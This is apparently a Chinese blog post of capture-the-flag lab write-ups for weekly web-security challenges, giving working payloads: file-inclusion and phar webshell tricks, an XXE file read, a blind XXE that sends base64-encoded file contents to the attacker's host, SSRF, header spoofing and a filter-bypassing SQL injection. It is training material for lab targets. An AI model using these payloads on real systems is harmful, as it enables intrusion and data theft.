# 合天网安Weekly系列（9-22）

<div class="has-toc have-toc">
</div>

## 0x00 前言

继续van。

## 0x01 第九周 | 试下phpinfo吧

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5009
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

根据题目，需要用到phpinfo页面。猜测需要利用文件包含漏洞。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-44.png" alt="" class="wp-image-623" width="460" height="99" /></figure>
</div>

把cn.php替换成phpinfo.php后失效，判断文件不在此目录，跳到父目录。打开了phpinfo。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-49.png" alt="" class="wp-image-643" width="465" height="338" /></figure>
</div>

网页底部藏着`flag{abcd_hetianlab_1234_qwer}`

## 0x02 第十周 | 试试协议吧

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5010
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

一进去就蹦出来个链接，点进去。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="166" height="42" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-46.png" alt="" class="wp-image-637" /></figure>
</div>

改下flie。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="130" height="35" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-47.png" alt="" class="wp-image-638" /></figure>
</div>

题目说要运用协议，那就尝试一番。`php://filter/convert.base64-encode/resource=flag.php`，就出来了一串base64编码。

<pre class="wp-block-code"><code>ZmxhZyBpbiBoZXJlDQo8P3BocCAvL2ZsYWd7YWJkY18xMjM0X3F3ZXJfaGV0aWFufT8+</code></pre>

成功拿到`flag{abdc_1234_qwer_hetian}`

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="258" height="42" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-48.png" alt="" class="wp-image-641" /></figure>
</div>

## 0x03 第十一周 | 签到般的包含

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5011
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}，菜刀目录：C:\tools\

传图片，直接失败。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-72.png" alt="" class="wp-image-731" width="191" height="96" /></figure>
</div>

测试发现jpg类型可以上传。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="478" height="46" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-74.png" alt="" class="wp-image-736" /></figure>
</div>

进入文件夹看一看。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-75.png" alt="" class="wp-image-738" width="367" height="278" /></figure>
</div>

题目说有个include.php文件，应该是个文件包含漏洞 ，输入url路径。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-73.png" alt="" class="wp-image-733" width="490" height="108" /></figure>
</div>

看了一位师傅的<a rel="noreferrer noopener" href="https://blog.csdn.net/m0_49835838/article/details/107761632" data-type="URL" data-id="https://blog.csdn.net/m0_49835838/article/details/107761632" target="_blank" rel="nofollow" >WP</a>，要用phar伪协议，这个协议可以访问zip格式压缩包内容，我们先构造一个压缩包写一个php一句话到1.php，再把1.php压缩成1.zip，为了成为白名单，把1.zip后缀改为jpg，成功上传。

在菜刀输入`http://10.1.1.147:5011/include.php?file=phar://a.jpg/a`，连上WebShell。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-77.png" alt="" class="wp-image-748" width="418" height="180" /></figure>
</div>

得到`flag{whoami_hetianlab_student}`。

<p class="has-vivid-red-color has-text-color">
  <strong>Ps：没有第十二周的实验</strong>，但可以根据题目iP猜测10.1.1.147:5012，进去提示加file参数
</p>

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="828" height="624" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-95.png" alt="" class="wp-image-816" /></figure>
</div>

<p class="has-vivid-red-color has-text-color">
  没啥思路，搜了下，发现有师傅做过<a rel="noreferrer noopener" href="https://www.bilibili.com/video/BV1jD4y1U7Vy" data-type="URL" data-id="https://www.bilibili.com/video/BV1jD4y1U7Vy" target="_blank" rel="nofollow" >视频</a>，视频开头给出了相关的题目信息，菜刀、日志路径、ubuntu系统和LFI（Local File Include），现有环境下按照师傅的方法无法复现，这题主要是通过<code>/var/log/apache2/access.log</code>进行命令执行，讲得挺好的。
</p>

## 0x04 第十三周 | simple xxe

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5013
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

查看源码，发现信息。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="1294" height="200" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-91.png" alt="" class="wp-image-808" /></figure>
</div>

随便输入后抓个包，发现用户名和密码是通过XML标签传值的，题目也明说了，要用XXE（XML External Entity）。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-92.png" alt="" class="wp-image-811" width="491" height="193" /></figure>
</div>

借助file协议实现外部实体声明来读取文件，代码如下：

<pre class="wp-block-code"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root &#91;
&lt;!ENTITY xxe SYSTEM "file:///opt/flag.txt"&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></pre>

成功拿到。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-93.png" alt="" class="wp-image-813" width="721" height="250" /></figure>
</div>

## 0x05 第十四周 | blind xxe

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5014
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

题目考察Blind&nbsp;XXE，查看源码发现目标文件。<figure class="wp-block-image size-large is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-96.png" alt="" class="wp-image-831" width="812" height="77" /> </figure> 

`ifconfig`查看本机ip为`10.1.1.100`，这里发现Apache服务没有开启，使用`service apache2 start`。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-97.png" alt="" class="wp-image-834" width="491" height="307" /></figure>
</div>

采用如下的payload

<pre class="wp-block-code"><code>post:
&lt;!DOCTYPE root &#91; 
&lt;!ENTITY % remote SYSTEM "http://10.1.1.100/1.dtd"&gt;
%remote;%int;%send;
]&gt;

1.dtd的内容
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///tmp/password.txt"&gt;
&lt;!ENTITY % int "&lt;!ENTITY &#37; send SYSTEM 'http://10.1.1.100:9999?p=%file;'&gt;"&gt;

python -m SimpleHTTPServer 9999</code></pre>

得到一串base64编码`ZmxhZ3toZXRpYW5fMTIzNF9hd2RyfQo=`，解码得到`flag{hetian_1234_awdr}`

## 0x06 第十五周 | 回显的SSRF

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5015
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

给出了flag在/opt/flag.txt，题目明示了是有回显的SSRF，用file协议直接读取。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="1276" height="347" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-140.png" alt="" class="wp-image-1123" /></figure>
</div>

## 0x07 第十六周 | 有点另类的SSRF

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5016
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

按照上一个实验的步骤用file协议直接读取，提示要以管理员身份登录。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-141.png" alt="" class="wp-image-1125" width="358" height="227" /></figure>
</div>

使用BurpPOST一个admin的值，得到下一条提示信息。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-142.png" alt="" class="wp-image-1127" width="788" height="162" /></figure>
</div>

使用X-Forwarded-For、X-Real-Ip、X-Client-Ip、Client-Ip等来伪造ip。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="532" height="180" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-143.png" alt="" class="wp-image-1129" /></figure>
</div>

打开source.txt，查看源码，能看到flag的文件位置。

<pre class="wp-block-code"><code>&lt;?php 
// /opt/flag.txt

function getUrlContent($url){
    // $url = safe($url);
    $url = escapeshellarg($url);
    $pl = "curl ".$url;
    // echo $pl;
    $content = shell_exec($pl);
    return $content;
}

echo "you need to login as admin!";
echo "&lt;!-- post param  'admin' --&gt;";
if(isset($_POST&#91;'admin']))
{
    if($_POST&#91;'admin']==1)
    {
        if($_SERVER&#91;'HTTP_X_CLIENT_IP'])
        {
            echo "fileread source.txt";
            if (isset($_POST&#91;'handler'])&&!empty($_POST&#91;'handler']))
            {
					$url = $_POST&#91;'handler'];
					$content_url = getUrlContent($url);
					echo $content_url;
}
}
        else
            {
                echo "only 127.0.0.1 can get the flag!!";
            }
}else
{
	$_POST&#91;'admin']=0;
}
}</code></pre>

## 0x08 第十七周 | 给你扔了串代码

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5017
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

首页给出了源代码的图片。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-144.png" alt="" class="wp-image-1132" width="457" height="326" /></figure>
</div>

这是一道变量覆盖的题目，重点关注这两段代码。

<pre class="wp-block-code"><code>foreach ($_GET as $key =&gt;$value){
       $$key=$$value;
}foreach ($_POST as $key =&gt;$value){
       $$key=$value;
}</code></pre>

这道题说f12可以使用hackbar，但实际上用不了，换个环境，继续做。Get传值时将$\_200的值设为$flag的值，POST传值flag=随便的数，就能绕过，然后输出$\_200里的值。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-146.png" alt="" class="wp-image-1137" width="309" height="317" /></figure>
</div>

## 0x09 第十八周 | 学会变量覆盖

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5018
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

查看源代码信息。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-147.png" alt="" class="wp-image-1141" width="374" height="283" /></figure>
</div>

试一下url后加上`/?gift`=，直接得到`flag{hetianlab}`，猜测变量content的值为空，变量flag需要传上去。

## 0x0A 第十九周 | Easy PHP

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5019
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

分析源码

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="566" height="517" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-148.png" alt="" class="wp-image-1147" /></figure>
</div>

重点关注Get传值方法，设一个中间变量来传递flag的值。

<div class="wp-block-image">
  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-149.png" alt="" class="wp-image-1149" width="387" height="197" /></figure>
</div>

## 0x0B 第二十周 | 最后一道变量覆盖

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5020
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

分析源码

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="741" height="514" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-150.png" alt="" class="wp-image-1153" /></figure>
</div>

这个需要利用PHP的弱类型来进行md5碰撞和parse_str的变量覆盖。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="558" height="93" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-151.png" alt="" class="wp-image-1155" /></figure>
</div>

## 0x0C 第二十一周 | 你的空格哪去了

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5021
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

简单的SQL注入，需要绕过空格的过滤。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="889" height="596" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-152.png" alt="" class="wp-image-1159" /></figure>
</div>

经过测试在order by 3时能够正常回显，order by 4时无回显，可知列数为3。构造语句`0'union/**/select/**/1,flag,3/**/from/**/flag#`，成功回显。

<div class="wp-block-image">
  <figure class="aligncenter size-large"><img loading="lazy" width="312" height="74" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-153.png" alt="" class="wp-image-1161" /></figure>
</div>

## 0x0D 第二十二周 | 想想怎么绕过过滤吧

  * **背景说明**
      * 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。
  * **实验环境**
      * 目标机：Centos7 IP地址：10.1.1.147:5022
      * 攻击机：Kali IP地址：随机分配
      * 要求：获取目标flag
      * 提示：flag格式为Flag{}

页面与上一题相同，select大写绕过即可。
